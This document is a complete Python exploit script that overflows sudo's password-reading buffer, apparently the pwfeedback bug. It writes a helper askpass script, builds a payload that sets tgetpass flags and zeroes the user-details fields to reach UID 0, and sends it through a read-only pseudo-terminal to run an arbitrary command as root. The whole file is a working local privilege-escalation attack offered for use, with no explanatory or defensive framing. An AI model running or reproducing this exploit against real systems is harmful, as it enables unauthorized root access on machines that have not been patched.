#!/usr/bin/python3
# Constants from sudo and develop.sh.
BUFFER_SIZE = 255
BUFFER_LOCATION = 0x242C0
OVERFLOW_TGETPASS_FLAGS = 0x244E4
OVERFLOW_USER_DETAILS = 0x24500
OVERFLOW_USER_DETAILS_LENGTH = 9 * 4 # 9 variables we care about and 4 bytes each (int).
OVERFLOW_SIGNO = 0x243E0
OVERFLOW_SIGNO_LENGTH = 65 * 4 # 65 signals at 4 bytes each.

TGP_ASKPASS = 0x4
TGP_STDIN = 0x2

# Derived/arbitrary constants.
OVERFLOW_TGP_OFFSET = OVERFLOW_TGETPASS_FLAGS - BUFFER_LOCATION
OVERFLOW_USER_DETAILS_OFFSET = OVERFLOW_USER_DETAILS - BUFFER_LOCATION
OVERFLOW_USER_DETAILS_END_OFFSET = OVERFLOW_USER_DETAILS_OFFSET + OVERFLOW_USER_DETAILS_LENGTH
OVERFLOW_SIGNO_OFFSET = OVERFLOW_SIGNO - BUFFER_LOCATION

import os
import json
import subprocess
import sys
import tempfile
import time

target_script = f"""
#!/usr/bin/python3

import os
import signal
import sys

# Be nice and still feed sudo. :)
print("password")
sys.stdout.flush()
sys.stdout.close()

# Copy stderr (which is our terminal) back to stdout and stdin.
sys.stdout = sys.stderr
sys.stdin = open("/proc/self/fd/2", "r")
if os.dup2(2, 0) != 0:
    print("Error setting up: stdin will not work.")
if os.dup2(2, 1) != 1:
    print("Error setting up: stdout will not work.")
if os.geteuid() != 0:
    print("Ouch. Something went wrong. We don't have root.")
    exit(0)

# We should have root! Execute the command!
args = {json.dumps(sys.argv[1:])}
os.execvp(args[0], args)
""".strip()

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <command to run>")
    exit(1)

with tempfile.NamedTemporaryFile(delete=False) as tmp:
    target = os.path.realpath(tmp.name)
    tmp.write(bytes(target_script, "utf-8"))

# Actual exploit. Store the command to run in an env var.
os.environ["SUDO_ASKPASS"] = target
os.chmod(target, 0o777)

# Create pseudo-pty. We make it read-only to cause the write call to fail and
# not decrement the pointer.
master, slave = os.openpty()
read_only_tty = os.open(os.ttyname(slave), os.O_NOCTTY | os.O_RDONLY)
sig_kill = b"\x15"

# Create a really long buffer to fit all our overflows and make sure to end it with a newline.
payload_str = b""
while len(payload_str) < OVERFLOW_TGP_OFFSET or len(payload_str) < OVERFLOW_USER_DETAILS_END_OFFSET:
    payload_str += b"\x00"
payload_str += b"\n"
payload_str = bytearray(payload_str)

# Set all the bytes that matter.
# 1. Make sure the ASKPASS and STDIN flags are still set. This is 8 bytes so zero the rest.
payload_str[OVERFLOW_TGP_OFFSET] = TGP_ASKPASS | TGP_STDIN
for i in range(OVERFLOW_TGP_OFFSET+1, OVERFLOW_TGP_OFFSET+8):
    payload_str[i] = 0
# 2. Zero out all the user details, that's our goal: UID 0!
for i in range(OVERFLOW_USER_DETAILS_OFFSET, OVERFLOW_USER_DETAILS_END_OFFSET):
    payload_str[i] = 0
# 3. Zero out all the signals. sudo will try to process them and crash itself.
for i in range(OVERFLOW_SIGNO_LENGTH):
    payload_str[OVERFLOW_SIGNO_OFFSET + i] = 0

# Now we can construct our payload. We terminate every BUFFER_SIZE to make sure
# sudo doesn't catch us.
n = BUFFER_SIZE-1
payload_chunks = [payload_str[i:i+n] for i in range(0, len(payload_str), n)]
payload = sig_kill.join(payload_chunks)

# Start sudo. The command doesn't matter here as control should never transfer there.
p = subprocess.Popen(
    ["sudo", "-S", "echo", "It seems like this version is not vulnerable and NOPASSWD has been set."],
    env=os.environ, stdin=read_only_tty,
)
time.sleep(0.5)           # Give it a bit to get to the password prompt.
os.write(master, payload) # Here goes nothing.
p.wait()

os.unlink(target)
